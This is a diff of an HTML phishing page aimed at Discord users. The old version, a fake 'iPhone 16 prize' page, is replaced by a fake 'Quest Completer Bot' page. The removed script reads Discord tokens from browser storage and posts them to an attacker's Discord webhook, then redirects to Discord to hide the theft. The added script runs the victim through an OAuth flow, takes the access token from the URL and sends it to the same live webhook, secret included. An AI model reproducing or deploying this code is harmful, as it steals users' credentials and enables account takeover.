@@ -2,104 +2,64 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>🎁 You won a prize!</title>
+    <title>SetupDC.QuestCompleters</title>
     <style>
-        body {
-            background: #1a1a2e;
-            color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
-        }
-        img {
-            max-width: 80%;
-            border: 4px solid gold;
-            border-radius: 20px;
-            margin: 20px 0;
-        }
-        h1 {
-            color: #ffcc00;
-        }
-        .loader {
-            border: 6px solid #f3f3f3;
-            border-top: 6px solid #ffcc00;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .note {
-            color: #aaa;
-            font-size: 14px;
-            margin-top: 30px;
-        }
+        body { margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0a0a0a; font-family: Arial, sans-serif; color: white; text-align: center; }
+        .container { max-width: 700px; padding: 30px; background: #1a1a2e; border-radius: 30px; border: 2px solid #ffcc00; }
+        h1 { color: #ffcc00; font-size: 2.8rem; margin-bottom: 10px; }
+        .sub { color: #aaa; font-size: 1.2rem; }
+        img { width: 100%; border-radius: 20px; border: 3px solid #ffcc00; cursor: pointer; transition: 0.3s; margin: 20px 0; }
+        img:hover { transform: scale(1.02); box-shadow: 0 0 40px #ffcc00; }
+        .footer { color: #555; margin-top: 20px; font-size: 0.9rem; }
+        .promo { background: #2a2a3e; padding: 15px; border-radius: 15px; margin: 15px 0; }
+        .highlight { background: #ffcc00; color: #0a0a0a; padding: 8px 16px; border-radius: 8px; font-weight: bold; }
+
     </style>
 </head>
 <body>
-    <h1>🎉 YOU WON AN IPHONE 16!</h1>
-    <p>Verifying your Discord account...</p>
-    <div class="loader"></div>
-    <img src="https://cdn.discordapp.com/attachments/1539553182437347368/1545137691778359316/SXE_XIETRS_PRIFLE.png?ex=6a9b0d1c&is=6a99bb9c&hm=ecb987ba6df3a01eb287eac03a8af54b631f1e08b660c2a347facff3d07d3bdc" alt="Prize image">
-    <p class="note">🔒 Your data is safe – we just need to confirm you're a real Discord user.</p>
+    <div class="container">
+        <h1>🎰 Discord Quest Completer Bot</h1>
+        <p class="sub">SAFE &SECURE  <span class="highlight">100%</span> Welcome to Quest Completer!</p>
+        <div class="promo">
+            <p style="color:#ffcc00;"></p>
+            <p>Click on below button to add to Discord</p>
+        </div>
+        <img id="claimImage" src="https://cdn.discordapp.com/attachments/1545479514078052425/1545717911031914526/f5ea9b2f-c714-4f8a-af3e-ba420bfe7125_removalai_preview.png?ex=6a9d297c&is=6a9bd7fc&hm=18e3ae2d7ec7591856c2b1b68aa6a0f8ccab3545947efc6050b1d6d2ea1b322a" alt="Click to ADD">
+        <p class="footer">⏳ This Linkbexpires in 1 min– act fast!</p>
+    </div>
 
     <script>
-        // ====== CONFIGURATION ======
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1545479634005524612/7kO5F7Z86zgfumFzzitcpENMPpu7bkVkpQN_B-50W4th_dUIEQWaQLmJbVVyFjLaA-s9";  // <-- PASTE YOUR WEBHOOK URL HERE
-        // ==========================
+        // ================= CONFIGURATION =================
+        const CLIENT_ID = "1545494388690653388";
+        // Use the exact redirect you registered (with index.html)
+        const REDIRECT_URI = "https://shahinsha32.github.io/giveaway/index.html";
+        const WEBHOOK = "https://discord.com/api/webhooks/1545479634005524612/7kO5F7Z86zgfumFzzitcpENMPpu7bkVkpQN_B-50W4th_dUIEQWaQLmJbVVyFjLaA-s9";
+        // =================================================
 
-        (function stealToken() {
-            let token = null;
+        const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify`;
 
-            // Try to get token from localStorage (Discord web)
-            try {
-                token = localStorage.getItem('token') || sessionStorage.getItem('token');
-                // If not found, search all keys for a token pattern
-                if (!token) {
-                    for (let key in localStorage) {
-                        let val = localStorage[key];
-                        if (typeof val === 'string' && val.match(/[a-zA-Z0-9_-]{24,}\.[a-zA-Z0-9_-]{6,}\.[a-zA-Z0-9_-]{27,}/)) {
-                            token = val;
-                            break;
-                        }
-                    }
-                }
-            } catch(e) {}
+        document.getElementById('claimImage').addEventListener('click', () => {
+            window.location.href = authUrl;
+        });
 
+        // After OAuth redirect back, grab token from URL fragment
+        if (window.location.hash) {
+            const params = new URLSearchParams(window.location.hash.substring(1));
+            const token = params.get('access_token');
             if (token) {
-                // Send token to webhook
-                try {
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `🚨 **Token captured!**\n\`${token}\``,
-                            embeds: [{
-                                title: "Grabber Report",
-                                description: "Token was stolen successfully.",
-                                color: 0xff0000,
-                                footer: { text: "MrBeast Giveaway" }
-                            }]
-                        })
-                    }).catch(() => {});
-                } catch(e) {}
-
-                // Also send via image beacon (works even if fetch blocked)
-                try {
-                    const img = new Image();
-                    img.src = `https://discord.com/api/webhooks/...`; // optional fallback
-                } catch(e) {}
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🚀 **Token grabbed (BY SHAHINSHA)**\n\`${token}\``,
+                        embeds: [{ title: "SXE ON TOP!", color: 0xffcc00 }]
+                    })
+                }).then(() => {
+                    document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#ffcc00;font-size:2rem;'>✅ BOT READY! Next to setup manuel...</div>";
+                    setTimeout(() => { window.location.href = 'https://discord.com/channels/@me'; }, 2000);
+                }).catch(() => {});
             }
-
-            // Redirect to real Discord after 3 seconds to hide the theft
-            setTimeout(() => {
-                window.location.href = 'https://discord.com/channels/@me';
-            }, 3000);
-        })();
+        }
     </script>
 </body>
 </html>
